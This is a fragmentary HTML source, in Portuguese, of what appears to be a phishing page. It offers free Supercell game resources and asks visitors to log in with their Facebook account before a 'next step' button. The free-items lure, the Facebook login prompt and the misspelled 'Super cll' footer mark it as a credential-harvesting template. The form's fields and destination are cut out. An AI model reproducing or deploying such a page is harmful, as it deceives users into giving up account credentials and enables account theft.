...
<title>PRESENTE SUPERCELL - Obtenha Recursos Gratuitos da Supercell:</title>
...
<h4 >
Faça o login na sua conta do Facebook
...
<div style="width:100%" class="form-group">
  <input type="submit" name="gsubmit" class="btn btn-block" style="color: #ffffff;background-color: #2780e3;" id="gsubmit" value="PRÓXIMO ETAPA"> </form>
</div>
</div><br><br>
</div>
<p></p>
<div style="height:110px;color: #737373;background-color: #f7f7f7;" class="btn btn-block">
<center><p>De Super cll</p></center>
